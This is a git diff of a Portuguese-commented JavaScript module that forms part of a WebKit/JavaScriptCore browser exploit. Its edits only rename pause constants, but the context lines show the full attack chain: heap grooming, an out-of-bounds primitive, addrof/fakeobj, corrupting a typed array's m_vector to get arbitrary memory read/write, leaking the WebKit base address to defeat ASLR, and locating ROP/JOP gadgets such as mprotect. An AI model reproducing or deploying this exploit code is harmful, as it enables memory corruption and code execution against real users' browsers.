@@ -16,7 +16,7 @@
 // - Medição de tempo para fases críticas.
 // =======================================================================================
 
-import { AdvancedInt64, toHex, isAdvancedInt64Object, SHORT_PAUSE, MEDIUM_PAUSE, LONG_PAUSE } from '../utils.mjs'; // Importar SHORT_PAUSE, MEDIUM_PAUSE, LONG_PAUSE de utils
+import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     getOOBDataView,
@@ -34,10 +34,9 @@ import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v118_R60_ASLR_LEAK_VECTOR_CORRUPTION"; // Renamed for new strategy
 
-// Removidas as definições locais, agora importadas de utils.mjs
-// const LOCAL_SHORT_PAUSE = 50;
-// const LOCAL_MEDIUM_PAUSE = 500;
-// const LOCAL_LONG_PAUSE = 1000;
+const LOCAL_SHORT_PAUSE = 50;
+const LOCAL_MEDIUM_PAUSE = 500;
+const LOCAL_LONG_PAUSE = 1000;
 
 let global_spray_objects = []; // Para heap grooming
 let pre_typed_array_spray = []; // Para grooming específico
@@ -97,7 +96,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         }
         logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
         logFn("Heap estabilizado inicialmente para reduzir realocações inesperadas pelo GC.", "good");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // --- FASE 2: Obtendo Primitivas OOB e inicializando addrof/fakeobj ---
         logFn("--- FASE 2: Obtendo primitivas OOB e inicializando addrof/fakeobj ---", "subtest");
@@ -112,12 +111,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             throw new Error(errMsg);
         }
         logFn(`Ambiente OOB configurado com DataView: ${oob_dataview !== null ? 'Pronto' : 'Falhou'}. Tempo: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // Inicializa as primitivas addrof/fakeobj do core_exploit
         initCoreAddrofFakeobjPrimitives();
         logFn("Primitivas 'addrof_core' e 'fakeobj_core' (no core_exploit.mjs) estão prontas.", "good");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // --- FASE 3: Construindo Primitivas de Leitura/Escrita Arbitrária TOTAL ---
         // A estratégia é corromper o m_vector de um Float64Array usando o DataView OOB.
@@ -129,9 +128,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`Float64Array 'rw_target_array' criado para R/W arbitrário.`, "debug");
 
         // 2. Obter o endereço do JSCell do rw_target_array
-        const rw_target_array_jscell_addr = addrof_core(rw_target_array); // Usar primitiva addrof_core
+        const rw_target_array_jscell_addr = addrof_core(rw_target_array);
         logFn(`Endereço do JSCell de 'rw_target_array': ${rw_target_array_jscell_addr.toString(true)}`, "info");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 3. Calcular o offset do m_vector dentro do JSCell do Float64Array
         // O offset do m_vector em um ArrayBufferView (como Float64Array) é conhecido.
@@ -140,7 +139,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const m_vector_offset_in_jscell = JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET;
         rw_target_array_m_vector_addr = rw_target_array_jscell_addr.add(m_vector_offset_in_jscell); // Assign to outer scope variable
         logFn(`Endereço do m_vector de 'rw_target_array' (calculado): ${rw_target_array_m_vector_addr.toString(true)} (offset 0x${m_vector_offset_in_jscell.toString(16)})`, "info");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 4. Salvar o m_vector original do oob_dataview (que aponta para oob_array_buffer_real)
         // Agora, usando os offsets atualizados e EXPORTADOS do core_exploit.mjs
@@ -156,7 +155,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // 5. Corromper o m_vector do oob_dataview_real para apontar para o m_vector do rw_target_array
         await oob_write_absolute(OOB_DV_M_VECTOR_ACTUAL_OFFSET, rw_target_array_m_vector_addr, 8);
         logFn(`m_vector do oob_dataview_real corrompido para apontar para o m_vector do rw_target_array.`, "info");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // Agora, o oob_dataview está apontando para o m_vector do rw_target_array.
         // Podemos usar o oob_dataview para ler/escrever o m_vector do rw_target_array.
@@ -197,7 +196,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         };
 
         logFn(`Primitivas de Leitura/Escrita Arbitrária TOTAL construídas com sucesso. Tempo: ${(performance.now() - arbSetupStartTime).toFixed(2)}ms`, "good");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
 
         // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA Uint8Array) ---
@@ -217,12 +216,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`Objeto Uint8Array criado para vazamento de ClassInfo.`, "debug");
         leak_candidate_typed_array.fill(0xAA);
         logFn(`Uint8Array preenchido com 0xAA.`, "debug");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 2. Obter o endereço de memória do Uint8Array (este é o JSCell do Uint8Array)
         const typed_array_jscell_addr = addrof_core(leak_candidate_typed_array); // Usar primitiva addrof_core
         logFn(`[REAL LEAK] Endereço do Uint8Array (JSCell): ${typed_array_jscell_addr.toString(true)}`, "leak");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 3. Ler o ponteiro para a Structure* do Uint8Array (JSCell)
         logFn(`[REAL LEAK] Tentando ler PONTEIRO para a Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do Uint8Array base (JSCell)...`, "info");
@@ -237,7 +236,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             throw new Error(errorMsg);
         }
         logFn(`[REAL LEAK] Ponteiro para a Structure* do Uint8Array: ${typed_array_structure_ptr.toString(true)}`, "leak");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 4. Ler o ponteiro para a ClassInfo* da Structure do Uint8Array
         const class_info_ptr = await arb_r(typed_array_structure_ptr.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET)); // USAR NOVA ARB_R
@@ -247,7 +246,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             throw new Error(errorMsg);
         }
         logFn(`[REAL LEAK] Ponteiro para a ClassInfo (esperado JSC::JSArrayBufferView::s_info): ${class_info_ptr.toString(true)}`, "leak");
-        await pauseFn(SHORT_PAUSE); // Usando SHORT_PAUSE
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 5. Calcular o endereço base do WebKit
         const S_INFO_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
@@ -260,7 +259,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         } else {
             logFn("SUCESSO: Endereço base REAL da WebKit OBTIDO VIA Uint8Array.", "good");
         }
-        await pauseFn(MEDIUM_PAUSE); // Usando MEDIUM_PAUSE
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
 
         // Descoberta de Gadgets (Funcional)
         logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
@@ -269,7 +268,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
         logFn(`PREPARADO: Ferramentas para ROP/JOP (endereços reais) estão prontas. Tempo: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
-        await pauseFn(MEDIUM_PAUSE); // Usando MEDIUM_PAUSE
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
 
         // --- FASE 5: Verificação Funcional de L/E e Teste de Resistência (Pós-Vazamento de ASLR) ---
         logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-Vazamento de ASLR) ---", "subtest");
